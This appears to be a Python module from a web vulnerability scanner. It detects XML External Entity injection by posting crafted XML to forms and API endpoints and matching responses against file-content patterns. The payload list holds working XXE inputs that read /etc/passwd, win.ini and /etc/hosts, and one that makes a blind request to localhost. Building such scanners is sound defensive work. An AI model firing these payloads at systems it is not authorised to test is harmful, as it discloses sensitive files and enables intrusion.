"""XML External Entity (XXE) injection scanner module."""
import re
from urllib.parse import urlparse

from app.scanner.crawler import CrawledPage
from app.scanner.http_client import HttpClient
from app.scanner.modules.base import BaseModule, Finding
from app.scanner.modules.registry import ModuleRegistry

# XXE payloads targeting common sensitive files
XXE_PAYLOADS = [
    # Classic /etc/passwd exfil
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>',
        "Classic XXE - /etc/passwd",
    ),
    # Windows target
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
        '<root>&xxe;</root>',
        "Classic XXE - Windows win.ini",
    ),
    # /etc/hosts
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>'
        '<root>&xxe;</root>',
        "Classic XXE - /etc/hosts",
    ),
    # Blind SSRF via XXE (http request)
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>'
        '<root>&xxe;</root>',
        "Blind SSRF via XXE",
    ),
]

XXE_INDICATORS = [
    re.compile(r"root:.*:/bin/", re.I),
    re.compile(r"\[extensions\]"),
    re.compile(r"for 16-bit app support"),
    re.compile(r"127\.0\.0\.1\s+localhost"),
    re.compile(r"daemon:.*:/usr/sbin", re.I),
]

XML_CONTENT_TYPES = ["application/xml", "text/xml", "application/json+xml"]


@ModuleRegistry.register
class XxeModule(BaseModule):
    name = "xxe"
    description = "Tests for XML External Entity (XXE) injection vulnerabilities"
    scan_modes = ["full"]
    is_active = True

    async def active_test_async(self, page: CrawledPage, http_client: HttpClient) -> list[Finding]:
        findings: list[Finding] = []

        # Look for XML upload forms or endpoints accepting XML
        for form in page.forms:
            if not self._form_accepts_xml(form):
                continue

            finding = await self._test_form_xxe(form, http_client)
            if finding:
                findings.append(finding)
                break

        # Test JSON API endpoints that might also accept XML (content-type confusion)
        parsed = urlparse(page.url)
        if any(seg in parsed.path.lower() for seg in ["/api/", "/soap/", "/xml/", "/upload", "/import", "/parse"]):
            finding = await self._test_endpoint_xxe(page.url, http_client)
            if finding:
                findings.append(finding)

        return findings

    def _form_accepts_xml(self, form) -> bool:
        """Heuristic: form targets an API endpoint or has file upload."""
        action = form.action.lower()
        if any(kw in action for kw in ["/api/", "/xml", "/soap", "/upload", "/import", "/parse"]):
            return True
        for inp in form.inputs:
            if inp.get("type") == "file":
                return True
        return False

    async def _test_form_xxe(self, form, http_client) -> Finding | None:
        for payload, label in XXE_PAYLOADS[:2]:
            try:
                response = await http_client.client.post(
                    form.action,
                    content=payload.encode(),
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                continue

            for indicator in XXE_INDICATORS:
                if indicator.search(response.text):
                    return Finding(
                        module_name=self.name,
                        vuln_type="XML External Entity (XXE) Injection",
                        severity="critical",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
                        owasp_category="A05",
                        cwe_id="CWE-611",
                        affected_url=form.action,
                        affected_parameter=None,
                        description=f"XXE injection via {label}. The server parsed external XML entities and disclosed file contents.",
                        remediation=(
                            "Disable external entity processing in the XML parser. "
                            "Use SAX parsers with FEATURE_EXTERNAL_GENERAL_ENTITIES=false. "
                            "Never parse untrusted XML with a permissive parser."
                        ),
                        confidence="confirmed",
                        evidence=[
                            {"type": "payload", "title": "XXE Payload", "content": payload[:200]},
                            {"type": "response", "title": "File Content Disclosed", "content": self._extract_match(response.text, indicator)},
                        ],
                    )
        return None

    async def _test_endpoint_xxe(self, url: str, http_client: HttpClient) -> Finding | None:
        for payload, label in XXE_PAYLOADS[:2]:
            try:
                response = await http_client.client.post(
                    url,
                    content=payload.encode(),
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                continue

            for indicator in XXE_INDICATORS:
                if indicator.search(response.text):
                    return Finding(
                        module_name=self.name,
                        vuln_type="XML External Entity (XXE) Injection",
                        severity="critical",
                        cvss_score=9.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
                        owasp_category="A05",
                        cwe_id="CWE-611",
                        affected_url=url,
                        affected_parameter=None,
                        description=f"XXE injection via {label} at XML-accepting endpoint.",
                        remediation="Disable external entity processing. Validate and sanitize all XML input.",
                        confidence="confirmed",
                        evidence=[
                            {"type": "payload", "title": "XXE Payload", "content": payload[:200]},
                            {"type": "response", "title": "File Content Disclosed", "content": self._extract_match(response.text, indicator)},
                        ],
                    )
        return None

    @staticmethod
    def _extract_match(text: str, pattern: re.Pattern, context: int = 120) -> str:
        m = pattern.search(text)
        if not m:
            return ""
        start = max(0, m.start() - context)
        end = min(len(text), m.end() + context)
        return f"...{text[start:end]}..."
